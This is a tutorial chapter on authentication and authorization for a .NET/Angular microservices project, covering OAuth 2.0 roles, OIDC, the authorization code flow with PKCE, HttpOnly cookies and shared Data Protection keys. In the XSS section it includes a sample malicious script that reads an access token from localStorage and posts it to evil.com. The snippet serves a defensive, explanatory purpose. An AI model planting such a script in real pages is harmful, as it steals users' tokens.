# Authentication & Authorization Overview

## What Is Authentication & Authorization?

When building distributed systems with multiple APIs, you need to:
1. **Authenticate** - Verify WHO is making the request (identity)
2. **Authorize** - Verify WHAT they are allowed to do (permissions)

```
Without Auth:
+-------------+     HTTP      +------------------+
| Angular SPA | ---------->  | Scheduling API   |
+-------------+              +------------------+
    Anyone can access any endpoint
    No user context
    No permissions

With Auth:
+-------------+     HTTP      +------------------+
| Angular SPA | ---------->  | Scheduling API   |  [Authorize] filters
+-------------+  (+ cookie)   +------------------+  User claims available
                                     |
                                     v
                            +-------------------+
                            | Authorization     |
                            | Server            |
                            | (Duende           |
                            | IdentityServer)   |
                            +-------------------+
    Only authenticated users
    Claims-based authorization
    User context in every request
```

---

## Why Auth Matters in Microservices/DDD

In a distributed system with multiple bounded contexts, authentication and authorization become cross-cutting concerns:

### The Problem

```
Current Architecture (No Auth):
+-------------------+     +-------------------+     +-------------------+
| Angular SPA       |     | Scheduling API    |     | Billing API       |
| (port 7003)       | --> | (port 7001)       |     | (port 7002)       |
+-------------------+     +-------------------+     +-------------------+

Questions we can't answer:
- WHO submitted this CreatePatientCommand?
- Can this user view all patients, or only their own?
- Should this user be able to suspend patients?
- Is this user allowed to access billing data?
```

### The Solution: Centralized Authentication

```
With Authentication Server:
+-------------------+
| Angular SPA       |
| (port 7003)       |
+--------+----------+
         |
         | Cookie-based authentication
         v
+-------------------+     +-----------------------+     +-------------------+
| Scheduling API    | <-- | Authorization Server  | --> | Billing API       |
| (port 7001)       |     | (Duende               |     | (port 7002)       |
|                   |     | IdentityServer)       |     |                   |
| [Authorize]       |     | (port 7010)           |     | [Authorize]       |
| HttpContext.User  |     +-----------------------+     | HttpContext.User  |
+-------------------+                                   +-------------------+

Now we know:
- User's identity (email, name, ID)
- User's roles (Admin, Doctor, Patient)
- User's scopes (what data they can access)
```

**Key Benefits:**
1. **Single source of truth** - All identity and authentication logic in one place
2. **User context everywhere** - Every API knows WHO is calling it
3. **Reusable claims** - User identity propagates across bounded contexts
4. **Fine-grained authorization** - Each API enforces its own policies

---

## OAuth 2.0 Roles

OAuth 2.0 defines four roles that interact during authentication:

| Role | Description | In This Project |
|------|-------------|-----------------|
| **Resource Owner** | The user who owns the data | Pieter (or any logged-in user) |
| **Client** | Application requesting access on behalf of the user | Angular SPA, Blazor Server |
| **Authorization Server** | Issues access tokens after authenticating the user | `Identity.WebApi` (Duende IdentityServer) |
| **Resource Server** | Hosts protected resources (APIs) | `Scheduling.WebApi`, `Billing.WebApi` |

### Example Flow

```
Resource Owner (Pieter) wants to create a patient

1. Pieter opens Angular SPA (Client)
2. SPA calls Scheduling API (Resource Server)
3. API requires authentication → redirects to Authorization Server
4. Pieter logs in at Authorization Server
5. Authorization Server issues tokens
6. API creates cookie from tokens (server-side)
7. Subsequent SPA requests include cookie automatically
8. API validates cookie and extracts user claims
9. API allows/denies request based on claims
```

---

## OpenID Connect (OIDC) Layer

OAuth 2.0 is designed for **authorization** (access delegation). OpenID Connect adds **authentication** (identity verification) on top of OAuth 2.0.

### OIDC Extends OAuth 2.0 With:

| Feature | OAuth 2.0 | OIDC |
|---------|-----------|------|
| **Purpose** | "Allow this app to access my data" | "Tell this app who I am" |
| **Token Type** | Access Token | ID Token + Access Token |
| **User Info** | Not standardized | Standardized claims (name, email, etc.) |
| **Scopes** | Custom scopes | `openid`, `profile`, `email` (standard) |
| **Discovery** | Not standardized | `/.well-known/openid-configuration` |

### Standard OIDC Scopes

| Scope | Claims Provided |
|-------|----------------|
| `openid` | Minimal (subject ID) - **required for OIDC** |
| `profile` | Name, birthdate, locale, etc. |
| `email` | Email address, email_verified |
| `offline_access` | Refresh token (for long-lived sessions) |

### Discovery Document

Every OIDC provider exposes a discovery endpoint:

```
GET https://localhost:7010/.well-known/openid-configuration

{
  "issuer": "https://localhost:7010",
  "authorization_endpoint": "https://localhost:7010/connect/authorize",
  "token_endpoint": "https://localhost:7010/connect/token",
  "userinfo_endpoint": "https://localhost:7010/connect/userinfo",
  "scopes_supported": ["openid", "profile", "email", "scheduling_api"],
  "response_types_supported": ["code"],
  "grant_types_supported": ["authorization_code", "refresh_token"]
}
```

This tells clients:
- Where to redirect users for login (`authorization_endpoint`)
- Where to exchange authorization codes for tokens (`token_endpoint`)
- What scopes are supported
- What grant types are allowed

---

## Authorization Code Flow (with PKCE)

The Authorization Code Flow is the most secure OAuth 2.0 flow for web applications. It ensures tokens never reach the browser.

### 12-Step Flow (Cookie-Based)

```
┌─────────────────────────────────────────────────────────────────────┐
│                          Complete Auth Flow                         │
└─────────────────────────────────────────────────────────────────────┘

1. User visits Angular app
   Browser → Angular SPA (port 7003)

2. Angular calls API endpoint
   Angular → GET https://localhost:7001/api/patients
   (No auth cookie present)

3. API returns 401 Unauthorized
   Scheduling API → 401 response
   (No authentication cookie found)

4. Angular interceptor catches 401
   HTTP Interceptor → Redirect browser to /auth/login on API

5. API triggers OIDC challenge
   Scheduling API /auth/login → 302 redirect to Authorization Server
   Location: https://localhost:7010/connect/authorize?response_type=code&client_id=...

6. User sees login page
   Browser → Authorization Server login form (Razor Page)
   User enters credentials (username/password)

7. Authorization Server validates credentials
   Identity.WebApi → ASP.NET Identity validates user
   User is valid → Create authorization code

8. Redirect back to API callback
   Authorization Server → 302 redirect to API
   Location: https://localhost:7001/signin-oidc?code=AUTH_CODE

9. API exchanges code for tokens (server-side)
   Scheduling API → POST https://localhost:7010/connect/token
   {
     "grant_type": "authorization_code",
     "code": "AUTH_CODE",
     "client_id": "scheduling_api",
     "client_secret": "***",  // Server-side only, never exposed to browser
     "redirect_uri": "https://localhost:7001/signin-oidc"
   }

   Response:
   {
     "access_token": "eyJhbG...",  // Short-lived (1 hour)
     "id_token": "eyJhbG...",      // Contains user claims
     "refresh_token": "Rx8F...",   // Long-lived (optional)
     "expires_in": 3600
   }

10. API creates HttpOnly cookie from tokens
    Scheduling API → Creates encrypted authentication cookie
    Set-Cookie: .AspNetCore.Cookies=ENCRYPTED_COOKIE; HttpOnly; Secure; SameSite=Lax

    Cookie contains:
    - User claims (email, name, roles)
    - Access token (for calling other APIs)
    - Refresh token (for renewing access token)

11. API redirects browser back to Angular
    Scheduling API → 302 redirect
    Location: https://localhost:7003/patients

12. Subsequent requests include cookie automatically
    Angular → GET https://localhost:7001/api/patients
    Cookie: .AspNetCore.Cookies=ENCRYPTED_COOKIE

    API reads cookie → extracts claims → User is authenticated
    HttpContext.User.Identity.Name = "pieter@example.com"
    HttpContext.User.IsInRole("Admin") = true

    Response: 200 OK with patient data
```

### Why Tokens Never Reach the Browser

**Security threat: XSS (Cross-Site Scripting)**

```
If tokens were stored in localStorage or sessionStorage:
+-------------------+
| Browser           |
| localStorage:     |
| - access_token    | <-- JavaScript can read this
| - refresh_token   |     Vulnerable to XSS attacks!
+-------------------+

Malicious script:
<script>
  // Steal tokens
  const token = localStorage.getItem('access_token');
  fetch('https://evil.com/steal', { body: token });
</script>
```

**Cookie-based architecture is safer:**

```
Cookie flow:
+-------------------+
| Browser           |
| Cookies:          |
| - .AspNetCore     | <-- HttpOnly flag prevents JavaScript access
|   .Cookies=***    |     Only sent via HTTP headers
+-------------------+

JavaScript CANNOT access HttpOnly cookies:
document.cookie  // Empty (HttpOnly cookies hidden)

Cookies sent automatically:
fetch('/api/patients', { credentials: 'include' })
// Cookie header added by browser automatically
```

**Key protections:**
- **HttpOnly** - JavaScript cannot read the cookie
- **Secure** - Cookie only sent over HTTPS
- **SameSite=Lax** - Protects against CSRF attacks
- **Server-side validation** - API validates cookie on every request

---

## Why Duende IdentityServer?

There are several options for implementing an authorization server in .NET. Here's how they compare:

| Option | Pros | Cons | Why Not? |
|--------|------|------|---------|
| **Duende IdentityServer** | Industry standard, mature, excellent docs, .NET native, built-in middleware, batteries-included | Commercial license for larger production (free Community Edition for learning/small apps) | **CHOSEN** - Industry leader, maximum learning value |
| **Keycloak** | Feature-rich, free, battle-tested | Java-based, heavy, non-.NET ecosystem | Not .NET native, abstracts internals |
| **Azure AD / Entra ID** | Cloud-managed, zero infrastructure | Abstracts OIDC internals, vendor lock-in | Less learning value (too much magic) |
| **Auth0 / Okta** | Full-featured IDaaS, low maintenance | SaaS pricing, vendor lock-in | Cost and learning abstraction |

### Why Duende IdentityServer for This Project

1. **Industry standard** - Successor to the legendary IdentityServer4, built by the original team
2. **Mature and well-documented** - Comprehensive official documentation and large community
3. **Free Community Edition** - Free for learning, development, and production with revenue < $1M USD
4. **.NET native** - Built specifically for .NET, leverages ASP.NET Core middleware
5. **Batteries-included** - Built-in OIDC endpoints (no custom controllers needed), UI templates, admin tools
6. **ASP.NET Identity integration** - Seamless integration with ASP.NET Identity for user management
7. **Learning-focused** - You see the full OIDC flow with less boilerplate than DIY solutions
8. **Production-ready** - Used by thousands of real applications worldwide

**Trade-off:** Commercial license required for larger production use (revenue > $1M), but the learning experience and developer productivity are exceptional.

---

## Cookie-Based Authentication Architecture

### Why Cookies Instead of Tokens in Browser Storage?

**Problem with browser storage:**

| Storage Location | Access | Vulnerability |
|------------------|--------|---------------|
| `localStorage` | JavaScript can read/write | XSS attacks can steal tokens |
| `sessionStorage` | JavaScript can read/write | XSS attacks can steal tokens |
| Memory (JS variable) | JavaScript can read/write | Lost on page refresh |

**Cookie advantages:**

| Feature | Benefit |
|---------|---------|
| **HttpOnly** | JavaScript CANNOT read the cookie (XSS protection) |
| **Secure** | Only sent over HTTPS (man-in-the-middle protection) |
| **SameSite** | Prevents CSRF attacks |
| **Automatic** | Browser sends cookie with every request (no manual Authorization header) |
| **Server-side tokens** | Access/refresh tokens stored in cookie (encrypted by Data Protection), never exposed to browser |

### Cookie Flow Diagram

```
┌──────────────────────────────────────────────────────────────────────┐
│                        Cookie-Based Auth Flow                         │
└──────────────────────────────────────────────────────────────────────┘

Angular SPA (Browser)
    │
    │ 1. GET /api/patients (no cookie)
    │
    v
Scheduling API (port 7001)
    │
    │ 2. No cookie → 401 Unauthorized
    │
    v
Angular Interceptor
    │
    │ 3. Redirect: window.location.href = '/auth/login'
    │
    v
Scheduling API /auth/login
    │
    │ 4. Trigger OIDC challenge (ChallengeAsync)
    │    Redirect → https://localhost:7010/connect/authorize?...
    │
    v
Authorization Server (port 7010)
    │
    │ 5. Show login form (Razor Page)
    │    User enters credentials
    │
    │ 6. Validate credentials (ASP.NET Identity)
    │    Create authorization code
    │
    │ 7. Redirect → https://localhost:7001/signin-oidc?code=AUTH_CODE
    │
    v
Scheduling API /signin-oidc
    │
    │ 8. Exchange code for tokens (server-to-server)
    │    POST https://localhost:7010/connect/token
    │
    │ 9. Receive tokens:
    │    {
    │      "access_token": "eyJhbG...",
    │      "id_token": "eyJhbG...",
    │      "refresh_token": "Rx8F..."
    │    }
    │
    │ 10. Create encrypted authentication cookie:
    │     Set-Cookie: .AspNetCore.Cookies=ENCRYPTED;
    │                 HttpOnly; Secure; SameSite=Lax
    │
    │ 11. Redirect → https://localhost:7003/patients
    │
    v
Angular SPA (Browser)
    │
    │ 12. GET /api/patients
    │     Cookie: .AspNetCore.Cookies=ENCRYPTED
    │
    v
Scheduling API
    │
    │ 13. Read cookie → decrypt → extract claims
    │     HttpContext.User.Identity.Name = "pieter@example.com"
    │
    │ 14. Validate claims → [Authorize] succeeds
    │
    │ 15. Return data
    │
    v
Angular SPA (display patients)
```

**Key points:**
- Tokens (access, refresh, ID) are **encrypted and stored in the cookie**
- Browser only sees an opaque cookie value
- API decrypts cookie to get tokens and claims
- Angular calls API with `credentials: 'include'` (sends cookie automatically)

---

## Data Protection and Shared Keys

When multiple APIs need to read the same authentication cookie, they must share **Data Protection keys**.

### The Problem

```
Cookie created by Scheduling API:
Set-Cookie: .AspNetCore.Cookies=ENCRYPTED_BY_SCHEDULING_KEY

Cookie sent to Billing API:
Cookie: .AspNetCore.Cookies=ENCRYPTED_BY_SCHEDULING_KEY

Billing API tries to decrypt:
Error: Unable to unprotect the message (different key)
```

### The Solution: Shared Data Protection Keys

```csharp
// BuildingBlocks.Infrastructure.Auth/DataProtectionExtensions.cs
public static IServiceCollection AddSharedDataProtection(
    this IServiceCollection services,
    IConfiguration configuration)
{
    // All APIs use the same application name (for key ring isolation)
    services.AddDataProtection()
        .SetApplicationName("SchedulingApp")  // Same for all APIs
        .PersistKeysToFileSystem(new DirectoryInfo(@"C:\keys\scheduling-app"))  // Shared location
        .ProtectKeysWithDpapi();  // Windows DPAPI encryption

    return services;
}
```

**In production:**
- Use Azure Key Vault (`PersistKeysToAzureBlobStorage` + `ProtectKeysWithAzureKeyVault`)
- Or Redis (`PersistKeysToStackExchangeRedis`)
- Or SQL Server (`PersistKeysToDbContext`)

**Why this matters:**
- User logs in via Scheduling API → cookie created
- User calls Billing API → Billing API must decrypt same cookie
- Both APIs need the same Data Protection keys

---

## Key Concepts Table

| Concept | What It Is | Where It Lives |
|---------|-----------|----------------|
| **Scopes** | Define what information the client can access (e.g., `openid`, `profile`, `scheduling_api`) | Authorization Server configuration (Duende IdentityServer) |
| **Client Registration** | Registered applications that can use OIDC (e.g., `scheduling_webapi`) | Authorization Server seed data (DbContext or in-memory config) |
| **Authorization Policies** | Rules for endpoint access (e.g., `[Authorize(Policy = "AdminOnly")]`) | API `Program.cs` (AddAuthorization) |
| **Data Protection Keys** | Shared encryption keys for cookies across APIs | File system, Azure Key Vault, Redis, or SQL Server |
| **Claims** | User information embedded in the cookie (email, roles, scopes) | Cookie (encrypted), read via `HttpContext.User.Claims` |
| **ID Token** | JWT containing user identity claims (name, email) | Issued by Authorization Server, stored in cookie |
| **Access Token** | JWT for accessing protected APIs | Issued by Authorization Server, stored in cookie |
| **Refresh Token** | Long-lived token for obtaining new access tokens | Issued by Authorization Server, stored in cookie |

---

## Complete Auth Flow (12 Steps)

This is the detailed Authorization Code Flow with PKCE, used when the user is not authenticated.

```
Step 1: User visits Angular app
    Browser → https://localhost:7003/patients

Step 2: Angular calls API endpoint
    Angular → GET https://localhost:7001/api/patients
    (No auth cookie present)

Step 3: API returns 401 Unauthorized
    Scheduling API → 401 response
    (Cookie middleware does not find valid auth cookie)

Step 4: Angular interceptor catches 401
    HTTP Interceptor → Redirect browser
    window.location.href = 'https://localhost:7001/auth/login'

Step 5: API's /auth/login triggers OIDC challenge
    Scheduling API /auth/login endpoint:
        return Challenge(new AuthenticationProperties
        {
            RedirectUri = "https://localhost:7003/patients"
        }, "oidc");

    Middleware generates redirect:
        Location: https://localhost:7010/connect/authorize?
                  response_type=code&
                  client_id=scheduling_webapi&
                  redirect_uri=https://localhost:7001/signin-oidc&
                  scope=openid profile email scheduling_api&
                  state=RANDOM_STATE&
                  code_challenge=SHA256_OF_VERIFIER&
                  code_challenge_method=S256

Step 6: User enters credentials on Authorization Server
    Browser → https://localhost:7010/connect/authorize?...
    Authorization Server shows login form (Razor Page)
    User enters username/password

Step 7: Authorization Server validates credentials
    Identity.WebApi → ASP.NET Identity validates user
    If valid:
        - Create authorization code
        - Store code with client_id, redirect_uri, code_challenge
        - Redirect back to API callback

    Location: https://localhost:7001/signin-oidc?
              code=AUTH_CODE&
              state=RANDOM_STATE

Step 8: API exchanges authorization code for tokens
    Scheduling API /signin-oidc callback:
        OIDC middleware automatically exchanges code for tokens

    POST https://localhost:7010/connect/token
    Content-Type: application/x-www-form-urlencoded

    grant_type=authorization_code&
    code=AUTH_CODE&
    client_id=scheduling_webapi&
    client_secret=SECRET&  // Server-side only
    redirect_uri=https://localhost:7001/signin-oidc&
    code_verifier=RANDOM_VERIFIER

    Response:
    {
      "access_token": "eyJhbG...",  // Short-lived (1 hour)
      "id_token": "eyJhbG...",      // User identity claims
      "refresh_token": "Rx8F...",   // Long-lived (30 days)
      "expires_in": 3600,
      "token_type": "Bearer"
    }

Step 9: API creates HttpOnly cookie from tokens
    OIDC middleware creates authentication cookie:
        - Encrypts tokens using Data Protection
        - Extracts claims from id_token
        - Creates ClaimsPrincipal

    Set-Cookie: .AspNetCore.Cookies=ENCRYPTED_COOKIE_VALUE;
                Path=/;
                HttpOnly;
                Secure;
                SameSite=Lax;
                Expires=Fri, 25-Mar-2026 23:59:59 GMT

    Cookie payload (encrypted):
    {
      "claims": [
        { "type": "sub", "value": "123e4567-e89b-12d3-a456-426614174000" },
        { "type": "name", "value": "Pieter" },
        { "type": "email", "value": "pieter@example.com" },
        { "type": "role", "value": "Admin" }
      ],
      "tokens": {
        "access_token": "eyJhbG...",
        "refresh_token": "Rx8F..."
      }
    }

Step 10: API redirects browser back to Angular
    Scheduling API → 302 redirect
    Location: https://localhost:7003/patients
    (Browser now has auth cookie)

Step 11: Angular makes authenticated request
    Angular → GET https://localhost:7001/api/patients
    fetch('/api/patients', { credentials: 'include' })

    Browser automatically includes cookie:
    Cookie: .AspNetCore.Cookies=ENCRYPTED_COOKIE_VALUE

Step 12: API validates cookie and returns data
    Scheduling API:
        - Cookie middleware decrypts cookie
        - Extracts ClaimsPrincipal
        - Sets HttpContext.User

    Controller:
    [Authorize]  // Succeeds (user is authenticated)
    public async Task<IActionResult> GetPatients()
    {
        var userName = HttpContext.User.Identity.Name;  // "pieter@example.com"
        var isAdmin = HttpContext.User.IsInRole("Admin");  // true

        // Return data
    }

    Response: 200 OK with patient data
```

---

## How Concepts Chain Together

Understanding how these concepts connect is crucial:

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Concept Dependency Chain                        │
└─────────────────────────────────────────────────────────────────────┘

1. SCOPES (Authorization Server config)
   ↓
   Requested by client during authorization:
   scope=openid profile email scheduling_api
   ↓
   Authorization Server validates scopes → issues tokens

2. CLAIMS (ID Token payload)
   ↓
   ID token contains user claims:
   {
     "sub": "123e4567-e89b-12d3-a456-426614174000",
     "name": "Pieter",
     "email": "pieter@example.com",
     "role": "Admin",
     "scope": "openid profile email scheduling_api"
   }
   ↓
   API extracts claims from ID token

3. COOKIES (Encrypted claim container)
   ↓
   Cookie stores encrypted claims:
   .AspNetCore.Cookies=ENCRYPTED_PAYLOAD
   ↓
   Cookie payload = { claims: [...], tokens: {...} }
   ↓
   Browser sends cookie with every request automatically

4. POLICIES (Authorization rules)
   ↓
   Controller checks claims via policies:
   [Authorize(Policy = "AdminOnly")]
   ↓
   Policy definition:
   options.AddPolicy("AdminOnly", policy =>
       policy.RequireClaim("role", "Admin"));
   ↓
   API allows/denies request based on user claims
```

**Example flow:**
1. User logs in → Authorization Server issues ID token with scopes `["openid", "profile", "scheduling_api"]`
2. ID token contains claims: `{ "email": "pieter@example.com", "role": "Admin" }`
3. API creates cookie with encrypted claims
4. User calls `/api/patients/suspend/{id}` → API reads cookie → extracts claims
5. Controller has `[Authorize(Policy = "AdminOnly")]` → checks `role` claim
6. Claim matches → request allowed

---

## Docs in This Phase

This phase implements authentication and authorization step-by-step:

| Doc | Title | Description |
|-----|-------|-------------|
| **01** | **01-auth-overview.md** | This file - concepts, flows, and architecture |
| **02** | **02-authorization-server-setup.md** | Create Identity.WebApi with Duende IdentityServer + ASP.NET Identity |
| **03** | **03-api-authentication.md** | Configure Scheduling/Billing APIs to validate cookies |
| **04** | **04-shared-data-protection.md** | Share Data Protection keys across APIs for cookie decryption |
| **05** | **05-authorization-policies.md** | Implement role-based and claims-based authorization |
| **06** | **06-frontend-integration.md** | Integrate Angular/Blazor with cookie-based auth |

---

## What You'll Build

By the end of this phase:

1. **Authorization Server (Identity.WebApi)**
   - Duende IdentityServer configuration
   - ASP.NET Identity for user management
   - Razor Pages for login/register (via IdentityServer UI templates)
   - Client and scope registration
   - Token issuance (authorization code flow)

2. **API Authentication (Scheduling/Billing)**
   - Cookie authentication middleware
   - OIDC client configuration
   - `/auth/login` challenge endpoint
   - `/auth/logout` endpoint
   - Shared Data Protection keys

3. **Authorization Policies**
   - Role-based policies (`AdminOnly`, `DoctorOnly`)
   - Scope-based policies (`RequireSchedulingApi`)
   - `[Authorize]` attributes on controllers

4. **Frontend Integration**
   - HTTP interceptor (Angular) or DelegatingHandler (Blazor)
   - Login redirect on 401
   - `credentials: 'include'` for cookie transmission
   - Display user info from claims

---

## Prerequisites

Before starting Phase 8:

- **Completed Phase 7** - Frontend (Angular or Blazor) consuming backend APIs
- **Aspire AppHost running** - All services orchestrated and accessible
- **Understanding of cookies** - HttpOnly, Secure, SameSite attributes
- **Basic OAuth 2.0 knowledge** - Roles, scopes, tokens (covered in this doc)
- **SQL Server** - For ASP.NET Identity user storage

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Final Auth Architecture                          │
└─────────────────────────────────────────────────────────────────────┘

Angular SPA (port 7003)
    │
    │ credentials: 'include' (sends cookie)
    │
    v
┌──────────────────────────────────────────────────────────────────────┐
│                           Resource Servers                            │
│                                                                       │
│  Scheduling API (port 7001)         Billing API (port 7002)          │
│  ┌──────────────────────┐          ┌──────────────────────┐          │
│  │ [Authorize]          │          │ [Authorize]          │          │
│  │ Cookie auth          │          │ Cookie auth          │          │
│  │ OIDC challenge       │          │ OIDC challenge       │          │
│  └──────────────────────┘          └──────────────────────┘          │
│          │                                  │                         │
│          └──────────────┬───────────────────┘                         │
│                         │                                             │
└─────────────────────────┼─────────────────────────────────────────────┘
                          │
                          │ OIDC discovery + token exchange
                          │
                          v
┌──────────────────────────────────────────────────────────────────────┐
│                      Authorization Server                            │
│                                                                       │
│  Identity.WebApi (port 7010)                                         │
│  ┌────────────────────────────────────────────────────────────────┐  │
│  │ Duende IdentityServer                                          │  │
│  │ - Client registration (scheduling_webapi, billing_webapi)      │  │
│  │ - Scope definition (openid, profile, email, scheduling_api)    │  │
│  │ - Token issuance (authorization code flow)                     │  │
│  │ - Discovery endpoint (/.well-known/openid-configuration)       │  │
│  │ - Built-in OIDC endpoints (/connect/authorize, /connect/token) │  │
│  │                                                                 │  │
│  │ ASP.NET Identity                                                │  │
│  │ - User storage (IdentityDb)                                    │  │
│  │ - Login/register (Razor Pages via IdentityServer templates)   │  │
│  │ - Role management                                              │  │
│  └────────────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────────┘
                          │
                          v
┌──────────────────────────────────────────────────────────────────────┐
│                     Shared Infrastructure                            │
│                                                                       │
│  BuildingBlocks.Infrastructure.Auth                                  │
│  - Data Protection key sharing                                       │
│  - Shared authentication helpers                                     │
│  - Cookie configuration                                              │
└──────────────────────────────────────────────────────────────────────┘
```

---

## Summary

### Key Takeaways

1. **OAuth 2.0 roles** - Resource Owner, Client, Authorization Server, Resource Server
2. **OIDC extends OAuth 2.0** - Adds identity layer with ID tokens and standard scopes
3. **Authorization Code Flow** - Secure flow where tokens never reach the browser
4. **Cookie-based auth** - HttpOnly cookies prevent XSS token theft
5. **Duende IdentityServer** - Industry-standard, .NET-native authorization server with excellent learning experience
6. **Shared Data Protection keys** - Required for multiple APIs to decrypt the same cookie
7. **Claims-based authorization** - User identity and permissions flow via claims in cookies

### Security Principles

- **Tokens in cookies, not localStorage** - Prevents XSS attacks
- **HttpOnly + Secure + SameSite** - Cookie protection attributes
- **Server-side token storage** - Access/refresh tokens encrypted in cookie
- **PKCE for Authorization Code Flow** - Prevents authorization code interception
- **Shared keys via secure storage** - Azure Key Vault in production, file system for dev

### What's Next

In the next doc, you'll set up the Authorization Server with Duende IdentityServer and ASP.NET Identity.

---

> Next: [02-authorization-server-setup.md](./02-authorization-server-setup.md) - Setting up the Authorization Server with Duende IdentityServer
